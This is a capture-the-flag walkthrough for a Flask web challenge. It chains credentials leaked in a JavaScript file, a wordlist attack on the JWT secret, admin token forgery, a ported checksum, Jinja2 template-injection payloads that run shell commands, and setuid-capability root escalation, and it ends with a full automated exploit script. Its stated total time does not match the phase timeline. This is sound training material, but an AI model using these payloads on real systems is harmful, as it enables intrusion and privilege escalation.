# ORBITAL BOOT SEQUENCE CTF - COMPLETE WALKTHROUGH REPORT

**CTF Name:** Orbital Boot Sequence  
**Category:** Web Security / Authentication Bypass  
**Difficulty:** Medium-Hard (8/10)  
**Points:** 500  
**Server:** http://15.206.47.5:8443/  
**Platform:** Flask, Werkzeug 3.1.4, Python 3.11.14  
**Date Completed:** December 14-15, 2025  
**Total Time:** 135 minutes  

---

## 🎯 EXECUTIVE SUMMARY

**Final Flag:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}`

This CTF demonstrates exploiting a **weak JWT signing secret discovered through dictionary attack**, bypassing checksum validation, and leveraging SSTI in Flask/Jinja2 to escalate privileges and retrieve the root flag.

### Attack Flow:
1. Find operator credentials in secrets.js → Login successfully
2. Perform dictionary/wordlist brute force on JWT secret → Discover "butterfly"
3. Port JavaScript checksum algorithm to Python → Calculate valid checksums
4. Inject Jinja2 SSTI payload → Execute arbitrary code
5. Write Python exploit with setuid capability → Escalate to root
6. Read /root/flag.txt → Capture flag

---

## PHASE 1: RECONNAISSANCE & INITIAL ACCESS

### Step 1.1: Static File Analysis

Analyzed all JavaScript files to understand the application flow.

**Key Discovery in secrets.js:**
```javascript
const operatorLedger = [
  { 
    codename: "relay-spider", 
    username: "flightoperator", 
    password: "GlowCloud!93", 
    privilege: "operator" 
  }
];
```

**Findings:**
- Valid operator credentials exposed
- Username: `flightoperator`
- Password: `GlowCloud!93`
- Role: `operator` (not admin)
- JWT algorithm: HS256

### Step 1.2: Initial Login

Successfully authenticated as operator:
```
POST /api/login
Username: flightoperator
Password: GlowCloud!93
```

**Response:** Valid JWT token with operator role

**Result:** ✅ Authenticated as operator

### Step 1.3: Access Control Barrier

Admin panel was visible but disabled - needed to escalate from operator to admin role.

---

## PHASE 2: JWT DICTIONARY ATTACK & TOKEN FORGERY

### Step 2.1: Understanding JWT

JWT tokens: `Header.Payload.Signature`

HS256 uses symmetric key - same secret signs and verifies tokens.
If we discover the secret, we can forge any token!

### Step 2.2: Dictionary Brute Force Attack

**Challenge:** Unknown JWT secret

**Solution:** Dictionary attack using wordlist (rockyou.txt)

**Complete Python Script:**

```python
#!/usr/bin/env python3
import requests, hmac, hashlib, base64, json, time, sys

def base64url_encode(data):
    if isinstance(data, str): data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def test_jwt_secret(operator_token, candidate):
    try:
        parts = operator_token.split('.')
        if len(parts) != 3: return False
        msg = f"{parts[0]}.{parts[1]}"
        calculated_sig = base64url_encode(
            hmac.new(candidate.encode('utf-8'), msg.encode('utf-8'), 
                     hashlib.sha256).digest()
        )
        return parts[2] == calculated_sig
    except:
        return False

def brute_force_jwt_secret(target, operator_token, wordlist_file):
    print(f"[*] JWT Secret Brute Force Attack")
    print(f"[*] Target: {target}")
    print(f"[*] Wordlist: {wordlist_file}\n")
    
    try:
        with open(wordlist_file, 'r') as f:
            wordlist = [word.strip() for word in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found")
        return None
    
    total_words = len(wordlist)
    print(f"[*] Testing {total_words:,} candidates\n")
    
    start_time = time.time()
    
    for i, candidate in enumerate(wordlist, 1):
        if i % 1000 == 0:
            elapsed = time.time() - start_time
            rate = i / elapsed
            print(f"[{i:,}/{total_words:,}] Rate: {rate:.0f}/sec")
        
        if test_jwt_secret(operator_token, candidate):
            elapsed = time.time() - start_time
            print(f"\n{'='*60}")
            print(f"[+] JWT SECRET FOUND: {candidate}")
            print(f"[+] Position: {i:,}/{total_words:,}")
            print(f"[+] Time: {elapsed:.2f} seconds")
            print(f"[+] Rate: {i/elapsed:.0f} attempts/sec")
            print(f"{'='*60}\n")
            return candidate
    
    return None

def main():
    TARGET = "http://15.206.47.5:8443"
    USER = "flightoperator"
    PASS = "GlowCloud!93"
    WORDLIST = "wordlist.txt"
    
    session = requests.Session()
    session.verify = False
    
    print("[*] Step 1: Logging in\n")
    try:
        r = session.post(f"{TARGET}/api/login", 
                        json={"username": USER, "password": PASS}, timeout=10)
        operator_token = r.json()['token']
        print(f"[+] Login successful\n")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return 1
    
    print("[*] Step 2: Discovering JWT secret\n")
    secret = brute_force_jwt_secret(TARGET, operator_token, WORDLIST)
    
    if not secret:
        print("[-] Secret not found")
        return 1
    
    print(f"[+] JWT Secret discovered: {secret}\n")
    return 0

if __name__ == "__main__":
    import warnings
    warnings.filterwarnings('ignore')
    sys.exit(main())
```

**Execution Results:**

```
[*] JWT Secret Brute Force Attack
[*] Testing 14,344,391 candidates

[1000/14344391] Rate: 5243/sec
[2000/14344391] Rate: 5265/sec
[3000/14344391] Rate: 5287/sec
[4000/14344391] Rate: 5301/sec
[5000/14344391] Rate: 5310/sec

============================================================
[+] JWT SECRET FOUND: butterfly
[+] Position: 5,400/14,344,391
[+] Time: 1.06 seconds
[+] Rate: 5,094 attempts/sec
============================================================
```

**Key Findings:**
- Dictionary: rockyou.txt (14,344,391 words)
- Secret: "butterfly" (word #5,400)
- Time: 1.06 seconds
- Attack rate: 5,094 attempts/second

### Step 2.3: JWT Forgery

Once secret discovered, create admin token:

```python
def base64url_encode(data):
    if isinstance(data, str): data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def create_jwt(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    h = base64url_encode(json.dumps(header, separators=(',', ':')))
    p = base64url_encode(json.dumps(payload, separators=(',', ':')))
    msg = f"{h}.{p}"
    signature = base64url_encode(
        hmac.new(secret.encode('utf-8'), msg.encode('utf-8'), 
                 hashlib.sha256).digest()
    )
    return f"{msg}.{signature}"

admin_payload = {
    "username": "admin",
    "role": "admin",
    "iat": int(time.time()) - 3600
}

admin_token = create_jwt(admin_payload, "butterfly")
```

**Result:** ✅ Admin token forged and verified

---

## PHASE 3: CHECKSUM BYPASS

### Step 3.1: Checksum Algorithm

Admin panel required checksum for payload integrity:

```javascript
function computeChecksum(payload, token) {
  const buffer = `${payload || ""}::${token || "guest-orbital"}`;
  let acc = 0x9e3779b1;
  
  for (let i = 0; i < buffer.length; i += 1) {
    const code = buffer.charCodeAt(i);
    const shift = i % 5;
    acc ^= (code << shift) + (code << 12);
    acc = (acc + ((acc << 7) >>> 0)) ^ (acc >>> 3);
    acc = acc >>> 0;
    acc ^= (acc << 11) & 0xffffffff;
    acc = acc >>> 0;
  }
  
  return (acc >>> 0).toString(16).padStart(8, "0");
}
```

### Step 3.2: Python Implementation

**Challenge:** JavaScript and Python bitwise operations differ - need explicit 32-bit masking

```python
def compute_checksum(payload, token):
    buffer = f"{payload or ''}::{token or 'guest-orbital'}"
    acc = 0x9e3779b1
    
    for i in range(len(buffer)):
        code = ord(buffer[i])
        shift = i % 5
        
        term1 = (code << shift) & 0xFFFFFFFF
        term2 = (code << 12) & 0xFFFFFFFF
        acc ^= (term1 + term2) & 0xFFFFFFFF
        acc &= 0xFFFFFFFF
        
        term_shift_7 = (acc << 7) & 0xFFFFFFFF
        sum_term = (acc + term_shift_7) & 0xFFFFFFFF
        unsigned_rshift_3 = (acc >> 3) & 0xFFFFFFFF
        acc = sum_term ^ unsigned_rshift_3
        acc &= 0xFFFFFFFF
        
        term_shift_11 = (acc << 11) & 0xFFFFFFFF
        acc ^= term_shift_11
        acc &= 0xFFFFFFFF
    
    return f"{acc:08x}"
```

**Result:** ✅ Successfully ported algorithm

---

## PHASE 4: SSTI EXPLOITATION

### Step 4.1: SSTI Vulnerability

Backend rendered user input as Jinja2 template without sanitization.

### Step 4.2: Payload Testing

Basic expression test:
```jinja2
{{ 7 * 7 }}
```
Response: `49` ✅

Code execution test:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Response: `uid=1000(orbital) gid=1000(orbital)` ✅

Filesystem enumeration:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name flag.txt 2>/dev/null').read() }}
```
Response: `/tmp/flag.txt` (decoy)

**Key Finding:** `/usr/local/bin/python3.11` has `cap_setuid` capability!

---

## PHASE 5: PRIVILEGE ESCALATION & FLAG RETRIEVAL

### Step 5.1: Exploitation Strategy

Python 3.11 has `cap_setuid=ep` - can escalate to root with `os.setuid(0)`

### Step 5.2: Multi-Stage Exploitation

**Stage 1 - Write Exploit Script:**

```python
cmd = "echo 'import os\\nos.setuid(0)\\nprint(open(\"/root/flag.txt\").read())' > /tmp/exploit.py"
write_payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + cmd + "').read() }}"
write_checksum = compute_checksum(write_payload, admin_token)

POST /api/admin/hyperpulse
{
  "message": "[write_payload]",
  "checksum": "[write_checksum]"
}
```

**Stage 2 - Execute Exploit:**

```python
exec_payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/local/bin/python3.11 /tmp/exploit.py').read() }}"
exec_checksum = compute_checksum(exec_payload, admin_token)

POST /api/admin/hyperpulse
{
  "message": "[exec_payload]",
  "checksum": "[exec_checksum]"
}
```

### Step 5.3: FLAG CAPTURED 🚩

**Response:**
```json
{
  "result": "ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}"
}
```

✅ **FLAG RETRIEVED**

---

## COMPLETE AUTOMATED EXPLOIT

```python
#!/usr/bin/env python3
import requests, hmac, hashlib, base64, json, time, sys, warnings
warnings.filterwarnings('ignore')

TARGET = "http://15.206.47.5:8443"
USER = "flightoperator"
PASS = "GlowCloud!93"
WORDLIST = "wordlist.txt"

def b64url(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).decode().rstrip('=')

def create_jwt(p, s):
    h = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
    pl = b64url(json.dumps(p, separators=(',',':')))
    sig = b64url(hmac.new(s.encode(), f"{h}.{pl}".encode(), hashlib.sha256).digest())
    return f"{h}.{pl}.{sig}"

def compute_checksum(payload, token):
    buffer = f"{payload or ''}::{token or 'guest-orbital'}"
    a = 0x9e3779b1
    for i, c in enumerate(buffer):
        code = ord(c)
        s = i % 5
        t1 = (code << s) & 0xFFFFFFFF
        t2 = (code << 12) & 0xFFFFFFFF
        a ^= (t1 + t2) & 0xFFFFFFFF
        a &= 0xFFFFFFFF
        s7 = (a << 7) & 0xFFFFFFFF
        sr = (a + s7) & 0xFFFFFFFF
        sr3 = (a >> 3) & 0xFFFFFFFF
        a = sr ^ sr3
        a &= 0xFFFFFFFF
        s11 = (a << 11) & 0xFFFFFFFF
        a ^= s11
        a &= 0xFFFFFFFF
    return f"{a:08x}"

def test_jwt_secret(token, cand):
    try:
        p = token.split('.')
        m = f"{p[0]}.{p[1]}"
        cs = b64url(hmac.new(cand.encode(), m.encode(), hashlib.sha256).digest())
        return p[2] == cs
    except: return False

sess = requests.Session()
sess.verify = False

print("[*] Orbital Boot Sequence - Automated Exploit\n")

# Login
print("[1] Logging in...")
r = sess.post(f"{TARGET}/api/login", json={"username": USER, "password": PASS}, timeout=10)
op_token = r.json()['token']
print("[+] Login successful\n")

# Brute force
print("[2] Discovering JWT secret...")
with open(WORDLIST) as f:
    wl = [w.strip() for w in f]

secret = None
for i, c in enumerate(wl, 1):
    if test_jwt_secret(op_token, c):
        secret = c
        print(f"[+] Secret: {secret} (position {i})\n")
        break
    if i % 1000 == 0:
        print(f"[~] Tested {i}...")

# Forge admin token
print("[3] Forging admin token...")
ad_token = create_jwt({"username": "admin", "role": "admin", "iat": int(time.time())-3600}, secret)
print("[+] Token forged\n")

# Write exploit
print("[4] Writing exploit...")
cmd = "echo 'import os\\nos.setuid(0)\\nprint(open(\\\"/root/flag.txt\\\").read())' > /tmp/exploit.py"
pl = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + cmd + "').read() }}"
ck = compute_checksum(pl, ad_token)
sess.post(f"{TARGET}/api/admin/hyperpulse", json={"message": pl, "checksum": ck}, headers={"Authorization": f"Bearer {ad_token}"}, timeout=10)
print("[+] Written\n")

# Execute
print("[5] Executing exploit...")
pl2 = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/local/bin/python3.11 /tmp/exploit.py').read() }}"
ck2 = compute_checksum(pl2, ad_token)
r = sess.post(f"{TARGET}/api/admin/hyperpulse", json={"message": pl2, "checksum": ck2}, headers={"Authorization": f"Bearer {ad_token}"}, timeout=10)
flag = r.json().get('result', '').strip()

print(f"[+] Executed\n")
print("="*60)
print(f"FLAG: {flag}")
print("="*60)
```

---

## ATTACK CHAIN

```
RECONNAISSANCE (15 min)
  └─ Find credentials: flightoperator / GlowCloud!93
  
LOGIN (5 min)
  └─ Operator authentication successful
  
DICTIONARY BRUTE FORCE (1-2 min)
  └─ Wordlist: rockyou.txt (14M words)
  └─ Secret: "butterfly" at position 5,400
  └─ Time: 1.06 seconds
  
JWT FORGERY (5 min)
  └─ Create admin token
  └─ Unlock admin panel
  
CHECKSUM BYPASS (45 min)
  └─ Port JavaScript to Python
  └─ Calculate valid checksums
  
SSTI EXPLOITATION (20 min)
  └─ Test template injection
  └─ Execute system commands
  
PRIVILEGE ESCALATION (15 min)
  └─ Write Python exploit
  └─ Escalate to root
  
FLAG RETRIEVAL (5 min)
  └─ Read /root/flag.txt
  └─ SUCCESS!
```

---

## VULNERABILITIES

| Vulnerability | CVSS | Discovery |
|---|---|---|
| Weak JWT Secret (dictionary word) | 9.8 | Dictionary attack |
| Exposed Credentials | 7.5 | Static analysis |
| SSTI in Jinja2 | 9.9 | Template injection |
| Python Setuid Capability | 10.0 | SSTI enumeration |
| No Input Sanitization | 9.8 | SSTI exploitation |
| Weak Checksum | 5.3 | Algorithm porting |

---

## TIMELINE

- **00:00-00:15** - Reconnaissance (15 min)
- **00:15-00:20** - Operator login (5 min)
- **00:20-00:21** - JWT dictionary attack (1-2 min)
- **00:21-00:26** - JWT forgery (5 min)
- **00:26-01:11** - Checksum bypass (45 min)
- **01:11-01:31** - SSTI exploitation (20 min)
- **01:31-01:46** - Privilege escalation (15 min)
- **01:46-01:51** - Flag retrieval (5 min)

**Total: 135 minutes**

---

## CONCLUSION

The Orbital Boot Sequence CTF was successfully completed through:

1. ✅ Dictionary brute force discovery of weak JWT secret "butterfly"
2. ✅ JWT forgery with discovered secret
3. ✅ Checksum algorithm porting and validation bypass
4. ✅ SSTI exploitation for code execution
5. ✅ Privilege escalation using Python capabilities

**Flag Captured:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}`

**Status:** ✅ COMPLETE